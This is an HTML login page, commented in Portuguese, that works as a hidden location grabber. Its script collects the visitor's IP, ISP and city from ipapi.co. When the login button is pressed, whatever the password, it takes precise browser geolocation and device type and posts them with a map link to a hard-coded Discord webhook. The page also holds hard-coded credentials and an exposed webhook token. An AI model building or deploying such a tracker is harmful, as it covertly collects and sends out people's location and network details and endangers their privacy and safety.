<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }

        /* Estilo da tela de login */
        #login-form {
            background-color: rgba(0, 0, 0, 0.6);
            padding: 40px;
            border-radius: 10px;
            width: 300px;
            margin: 0 auto;
        }

        #login-form input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #444;
            border-radius: 5px;
            background-color: #222;
            color: white;
        }

        #login-form button {
            background-color: #444;
            color: white;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        #login-form button:hover {
            background-color: #666;
        }

        /* Estilo para esconder o conteúdo */
        #content {
            display: none;
        }
    </style>
    <script>
        let ipInfo = {};

        // Carregar as informações do IP
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                ipInfo = data;
            })
            .catch(error => {
                console.error("Erro ao obter as informações do IP: ", error);
            });

        // Função para esconder a tela de login e mostrar o conteúdo
        function login() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Enviar informações de localização e IP independentemente da senha
            getLocation();

            // Verificar se o login é válido (apenas um exemplo simples)
            if (username === "admin" && password === "12345") {
                // Esconder o login
                document.getElementById("login-form").style.display = "none";
                // Exibir o conteúdo
                document.getElementById("content").style.display = "block";
            } else {
                alert("Login inválido!");
            }
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                alert("Geolocalização não suportada pelo seu navegador.");
            }
        }

        function detectarDispositivo() {
            let userAgent = navigator.userAgent.toLowerCase();
            let tipo = "Desktop";  // Assume Desktop by default

            if (/android|iphone|ipad|ipod/i.test(userAgent)) {
                tipo = "Mobile";
            } else if (/tablet|ipad/i.test(userAgent)) {
                tipo = "Tablet";
            }

            return tipo;
        }

        function showPosition(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
            let dispositivo = detectarDispositivo();

            // Enviar as informações para o Discord
            sendToDiscord(lat, lon, dispositivo);
        }

        function showError(error) {
            alert("Erro ao obter localização.");
        }

        function sendToDiscord(lat, lon, dispositivo) {
            let webhookURL = "https://discord.com/api/webhooks/1355362348730155300/l6FzvrgOMMQZFV6aEZM9SAelYvPn_yzW8Sg10-EyAgc6LcOPFd5630dqbs27gluAGM3e";
            let message = {
                content: `Localização e IP obtidos!\nIP: ${ipInfo.ip}\nProvedor: ${ipInfo.org}\nNome da Conexão: ${ipInfo.asn}\nCidade: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}\nLatitude: ${lat}\nLongitude: ${lon}\nPlataforma: ${dispositivo}\n[Ver no mapa](https://www.google.com/maps?q=${lat},${lon})`
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (response.ok) {
                    console.log("Mensagem enviada com sucesso para o Discord");
                } else {
                    console.log("Falha ao enviar a mensagem para o Discord");
                }
            })
            .catch(error => {
                console.error("Erro ao enviar para o Discord: ", error);
            });
        }
    </script>
</head>
<body>
    <!-- Tela de Login -->
    <div id="login-form">
        <h2>Login</h2>
        <input type="text" id="username" placeholder="Usuário" required>
        <input type="password" id="password" placeholder="Senha" required>
        <button onclick="login()">Entrar</button>
    </div>

    <!-- Conteúdo invisível até o login -->
    <div id="content">
        <h1>Bem-vindo!</h1>
        <p>O sistema está enviando suas informações de localização e IP em segundo plano...</p>
    </div>
</body>
</html>